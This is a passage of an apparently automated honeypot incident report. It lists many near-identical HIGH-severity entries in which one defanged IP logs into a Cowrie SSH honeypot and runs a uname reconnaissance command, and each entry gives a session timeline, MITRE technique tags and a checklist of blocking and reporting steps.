| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:33` | `cowrie.session.connect` |
| `2026-09-27 13:00:34` | `cowrie.client.version` |
| `2026-09-27 13:00:34` | `cowrie.client.kex` |
| `2026-09-27 13:00:34` | `cowrie.login.success` |
| `2026-09-27 13:00:35` | `cowrie.session.params` |
| `2026-09-27 13:00:35` | `cowrie.command.input` |
| `2026-09-27 13:00:35` | `cowrie.log.closed` |
| `2026-09-27 13:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6123aed4a03

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:39` | `cowrie.session.connect` |
| `2026-09-27 13:00:39` | `cowrie.client.version` |
| `2026-09-27 13:00:39` | `cowrie.client.kex` |
| `2026-09-27 13:00:39` | `cowrie.login.success` |
| `2026-09-27 13:00:40` | `cowrie.session.params` |
| `2026-09-27 13:00:40` | `cowrie.command.input` |
| `2026-09-27 13:00:41` | `cowrie.log.closed` |
| `2026-09-27 13:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ef4d194c7c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:44` | `cowrie.session.connect` |
| `2026-09-27 13:00:44` | `cowrie.client.version` |
| `2026-09-27 13:00:44` | `cowrie.client.kex` |
| `2026-09-27 13:00:45` | `cowrie.login.success` |
| `2026-09-27 13:00:45` | `cowrie.session.params` |
| `2026-09-27 13:00:45` | `cowrie.command.input` |
| `2026-09-27 13:00:45` | `cowrie.log.closed` |
| `2026-09-27 13:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5adfa49cb84

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:49` | `cowrie.session.connect` |
| `2026-09-27 13:00:49` | `cowrie.client.version` |
| `2026-09-27 13:00:50` | `cowrie.client.kex` |
| `2026-09-27 13:00:50` | `cowrie.login.success` |
| `2026-09-27 13:00:50` | `cowrie.session.params` |
| `2026-09-27 13:00:50` | `cowrie.command.input` |
| `2026-09-27 13:00:51` | `cowrie.log.closed` |
| `2026-09-27 13:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61447f5893d1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:54` | `cowrie.session.connect` |
| `2026-09-27 13:00:54` | `cowrie.client.version` |
| `2026-09-27 13:00:55` | `cowrie.client.kex` |
| `2026-09-27 13:00:55` | `cowrie.login.success` |
| `2026-09-27 13:00:56` | `cowrie.session.params` |
| `2026-09-27 13:00:56` | `cowrie.command.input` |
| `2026-09-27 13:00:56` | `cowrie.log.closed` |
| `2026-09-27 13:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74fef43cef3f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:00` | `cowrie.session.connect` |
| `2026-09-27 13:01:00` | `cowrie.client.version` |
| `2026-09-27 13:01:00` | `cowrie.client.kex` |
| `2026-09-27 13:01:01` | `cowrie.login.success` |
| `2026-09-27 13:01:01` | `cowrie.session.params` |
| `2026-09-27 13:01:01` | `cowrie.command.input` |
| `2026-09-27 13:01:01` | `cowrie.log.closed` |
| `2026-09-27 13:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a947661ed4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:05` | `cowrie.session.connect` |
| `2026-09-27 13:01:05` | `cowrie.client.version` |
| `2026-09-27 13:01:05` | `cowrie.client.kex` |
| `2026-09-27 13:01:05` | `cowrie.login.success` |
| `2026-09-27 13:01:06` | `cowrie.session.params` |
| `2026-09-27 13:01:06` | `cowrie.command.input` |
| `2026-09-27 13:01:06` | `cowrie.log.closed` |
| `2026-09-27 13:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08f15f6486d7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:10` | `cowrie.session.connect` |
| `2026-09-27 13:01:10` | `cowrie.client.version` |
| `2026-09-27 13:01:10` | `cowrie.client.kex` |
| `2026-09-27 13:01:10` | `cowrie.login.success` |
| `2026-09-27 13:01:11` | `cowrie.session.params` |
| `2026-09-27 13:01:11` | `cowrie.command.input` |
| `2026-09-27 13:01:11` | `cowrie.log.closed` |
| `2026-09-27 13:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c46637b6339

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:15` | `cowrie.session.connect` |
| `2026-09-27 13:01:15` | `cowrie.client.version` |
| `2026-09-27 13:01:15` | `cowrie.client.kex` |
| `2026-09-27 13:01:15` | `cowrie.login.success` |
| `2026-09-27 13:01:16` | `cowrie.session.params` |
| `2026-09-27 13:01:16` | `cowrie.command.input` |
| `2026-09-27 13:01:16` | `cowrie.log.closed` |
| `2026-09-27 13:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64075a102411

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:20` | `cowrie.session.connect` |
| `2026-09-27 13:01:20` | `cowrie.client.version` |
| `2026-09-27 13:01:20` | `cowrie.client.kex` |
| `2026-09-27 13:01:20` | `cowrie.login.success` |
| `2026-09-27 13:01:21` | `cowrie.session.params` |
| `2026-09-27 13:01:21` | `cowrie.command.input` |
| `2026-09-27 13:01:21` | `cowrie.log.closed` |
| `2026-09-27 13:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545a0f638e51

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:24` | `cowrie.session.connect` |
| `2026-09-27 13:01:24` | `cowrie.client.version` |
| `2026-09-27 13:01:25` | `cowrie.client.kex` |
| `2026-09-27 13:01:25` | `cowrie.login.success` |
| `2026-09-27 13:01:26` | `cowrie.session.params` |
| `2026-09-27 13:01:26` | `cowrie.command.input` |
| `2026-09-27 13:01:26` | `cowrie.log.closed` |
| `2026-09-27 13:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c905cd1a721

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:29` | `cowrie.session.connect` |
| `2026-09-27 13:01:29` | `cowrie.client.version` |
| `2026-09-27 13:01:29` | `cowrie.client.kex` |
| `2026-09-27 13:01:30` | `cowrie.login.success` |
| `2026-09-27 13:01:30` | `cowrie.session.params` |
| `2026-09-27 13:01:30` | `cowrie.command.input` |
| `2026-09-27 13:01:31` | `cowrie.log.closed` |
| `2026-09-27 13:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09f802fe543

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:34` | `cowrie.session.connect` |
| `2026-09-27 13:01:34` | `cowrie.client.version` |
| `2026-09-27 13:01:34` | `cowrie.client.kex` |
| `2026-09-27 13:01:34` | `cowrie.login.success` |
| `2026-09-27 13:01:35` | `cowrie.session.params` |
| `2026-09-27 13:01:35` | `cowrie.command.input` |
| `2026-09-27 13:01:36` | `cowrie.log.closed` |
| `2026-09-27 13:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c8e6078a5e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:39` | `cowrie.session.connect` |
| `2026-09-27 13:01:39` | `cowrie.client.version` |
| `2026-09-27 13:01:39` | `cowrie.client.kex` |
| `2026-09-27 13:01:39` | `cowrie.login.success` |
| `2026-09-27 13:01:40` | `cowrie.session.params` |
| `2026-09-27 13:01:40` | `cowrie.command.input` |
| `2026-09-27 13:01:40` | `cowrie.log.closed` |
| `2026-09-27 13:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec2ad762648

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:44` | `cowrie.session.connect` |
| `2026-09-27 13:01:44` | `cowrie.client.version` |
| `2026-09-27 13:01:44` | `cowrie.client.kex` |
| `2026-09-27 13:01:44` | `cowrie.login.success` |
| `2026-09-27 13:01:45` | `cowrie.session.params` |
| `2026-09-27 13:01:45` | `cowrie.command.input` |
| `2026-09-27 13:01:45` | `cowrie.log.closed` |
| `2026-09-27 13:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6465ecb1954d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:49` | `cowrie.session.connect` |
| `2026-09-27 13:01:49` | `cowrie.client.version` |
| `2026-09-27 13:01:49` | `cowrie.client.kex` |
| `2026-09-27 13:01:49` | `cowrie.login.success` |
| `2026-09-27 13:01:50` | `cowrie.session.params` |
| `2026-09-27 13:01:50` | `cowrie.command.input` |
| `2026-09-27 13:01:50` | `cowrie.log.closed` |
| `2026-09-27 13:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a74fa0e13aa

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:54` | `cowrie.session.connect` |
| `2026-09-27 13:01:54` | `cowrie.client.version` |
| `2026-09-27 13:01:54` | `cowrie.client.kex` |
| `2026-09-27 13:01:54` | `cowrie.login.success` |
| `2026-09-27 13:01:55` | `cowrie.session.params` |
| `2026-09-27 13:01:55` | `cowrie.command.input` |
| `2026-09-27 13:01:55` | `cowrie.log.closed` |
| `2026-09-27 13:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd13779d474

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:01 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:01:59` | `cowrie.session.connect` |
| `2026-09-27 13:01:59` | `cowrie.client.version` |
| `2026-09-27 13:01:59` | `cowrie.client.kex` |
| `2026-09-27 13:02:00` | `cowrie.login.success` |
| `2026-09-27 13:02:00` | `cowrie.session.params` |
| `2026-09-27 13:02:00` | `cowrie.command.input` |
| `2026-09-27 13:02:01` | `cowrie.log.closed` |
| `2026-09-27 13:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42434d46dbf1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:04` | `cowrie.session.connect` |
| `2026-09-27 13:02:04` | `cowrie.client.version` |
| `2026-09-27 13:02:04` | `cowrie.client.kex` |
| `2026-09-27 13:02:04` | `cowrie.login.success` |
| `2026-09-27 13:02:05` | `cowrie.session.params` |
| `2026-09-27 13:02:05` | `cowrie.command.input` |
| `2026-09-27 13:02:06` | `cowrie.log.closed` |
| `2026-09-27 13:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4c0587b7bf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:09` | `cowrie.session.connect` |
| `2026-09-27 13:02:09` | `cowrie.client.version` |
| `2026-09-27 13:02:09` | `cowrie.client.kex` |
| `2026-09-27 13:02:09` | `cowrie.login.success` |
| `2026-09-27 13:02:10` | `cowrie.session.params` |
| `2026-09-27 13:02:10` | `cowrie.command.input` |
| `2026-09-27 13:02:10` | `cowrie.log.closed` |
| `2026-09-27 13:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663bafad6991

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:13` | `cowrie.session.connect` |
| `2026-09-27 13:02:13` | `cowrie.client.version` |
| `2026-09-27 13:02:13` | `cowrie.client.kex` |
| `2026-09-27 13:02:14` | `cowrie.login.success` |
| `2026-09-27 13:02:15` | `cowrie.session.params` |
| `2026-09-27 13:02:15` | `cowrie.command.input` |
| `2026-09-27 13:02:15` | `cowrie.log.closed` |
| `2026-09-27 13:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dcf6df9693e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:18` | `cowrie.session.connect` |
| `2026-09-27 13:02:18` | `cowrie.client.version` |
| `2026-09-27 13:02:18` | `cowrie.client.kex` |
| `2026-09-27 13:02:19` | `cowrie.login.success` |
| `2026-09-27 13:02:19` | `cowrie.session.params` |
| `2026-09-27 13:02:19` | `cowrie.command.input` |
| `2026-09-27 13:02:19` | `cowrie.log.closed` |
| `2026-09-27 13:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c832a0faee8e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:23` | `cowrie.session.connect` |
| `2026-09-27 13:02:23` | `cowrie.client.version` |
| `2026-09-27 13:02:23` | `cowrie.client.kex` |
| `2026-09-27 13:02:24` | `cowrie.login.success` |
| `2026-09-27 13:02:25` | `cowrie.session.params` |
| `2026-09-27 13:02:25` | `cowrie.command.input` |
| `2026-09-27 13:02:25` | `cowrie.log.closed` |
| `2026-09-27 13:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2948b81b3158

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:28` | `cowrie.session.connect` |
| `2026-09-27 13:02:28` | `cowrie.client.version` |
| `2026-09-27 13:02:28` | `cowrie.client.kex` |
| `2026-09-27 13:02:28` | `cowrie.login.success` |
| `2026-09-27 13:02:29` | `cowrie.session.params` |
| `2026-09-27 13:02:29` | `cowrie.command.input` |
| `2026-09-27 13:02:29` | `cowrie.log.closed` |
| `2026-09-27 13:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d85ba114c33

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:33` | `cowrie.session.connect` |
| `2026-09-27 13:02:33` | `cowrie.client.version` |
| `2026-09-27 13:02:33` | `cowrie.client.kex` |
| `2026-09-27 13:02:34` | `cowrie.login.success` |
| `2026-09-27 13:02:35` | `cowrie.session.params` |
| `2026-09-27 13:02:35` | `cowrie.command.input` |
| `2026-09-27 13:02:35` | `cowrie.log.closed` |
| `2026-09-27 13:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a68241ccec7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:02 |
| **Last Seen** | 2026-09-27 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:02:38` | `cowrie.session.connect` |
| `2026-09-27 13:02:38` | `cowrie.client.version` |
| `2026-09-27 13:02:38` | `cowrie.client.kex` |
| `2026-09-27 13:02:39` | `cowrie.login.success` |
| `2026-09-27 13:02:39` | `cowrie.session.params` |
| `2026-09-27 13:02:39` | `cowrie.command.input` |
| `2026-09-27 13:02:39` | `cowrie.log.closed` |
| `2026-09-27 13:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83a00593bbf

| Field | Detail |
